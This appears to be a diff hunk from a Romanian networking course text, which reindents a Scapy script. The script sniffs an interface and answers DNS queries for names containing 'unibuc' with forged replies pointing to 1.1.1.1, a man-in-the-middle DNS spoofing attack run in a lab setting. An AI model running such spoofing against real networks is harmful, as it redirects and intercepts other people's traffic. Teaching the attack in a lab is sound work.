@@ -1193,22 +1193,21 @@ Putem seta DNS-ul nostru (pe linux, în fișierul `/etc/resolv.conf` sau ca în 
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, proto=socket.IPPROTO_UDP)
 s.bind(('0.0.0.0', 53))
 def spoof_dns(packet):
-  ip = packet.getlayer(IP)
-  udp = packet.getlayer(UDP)
-  dnsqr = packet.getlayer(DNSQR)
-  # daca pachetul are IP/UDP/DNS/DNSQR
-  if dnsqr is not None and ip is not None and udp is not None:
-    print(packet.__str__)
-    if 'unibuc' in dnsqr.qname.decode('utf-8'):
-      # sursa este destinatia si vice-versa
-      ip_response = IP(src=ip.dst, dst=ip.src)
-      udp_response = UDP(sport=udp.dport, dport=udp.sport)
-      dns_answer = DNSRR(
-          rrname=dnsqr.qname, ttl=330, type="A", rclass="IN", rdata='1.1.1.1')
-      dns_response = DNS(id = packet[DNS].id, qr = 1, aa = 0, rcode = 0, qd = packet.qd, an = dns_answer)
-      print (dns_response.__str__)
-      send(ip_response / udp_response / dns_response)
-
+    ip = packet.getlayer(IP)
+    udp = packet.getlayer(UDP)
+    dnsqr = packet.getlayer(DNSQR)
+    # daca pachetul are IP/UDP/DNS/DNSQR
+    if dnsqr is not None and ip is not None and udp is not None:
+        print(packet.__str__)
+        if 'unibuc' in dnsqr.qname.decode('utf-8'):
+            # sursa este destinatia si vice-versa
+            ip_response = IP(src=ip.dst, dst=ip.src)
+            udp_response = UDP(sport=udp.dport, dport=udp.sport)
+            dns_answer = DNSRR(
+                rrname=dnsqr.qname, ttl=330, type="A", rclass="IN", rdata='1.1.1.1')
+            dns_response = DNS(id = packet[DNS].id, qr = 1, aa = 0, rcode = 0, qd = packet.qd, an = dns_answer)
+            print (dns_response.__str__)
+            send(ip_response / udp_response / dns_response)
 # alegem interfata pe care sa trimite, eth1 in cazul routerului
 sniff(prn=spoof_dns, iface='eth1')
 # daca suntem intermediar, ar trebui sa oprim orice alte raspunsuri
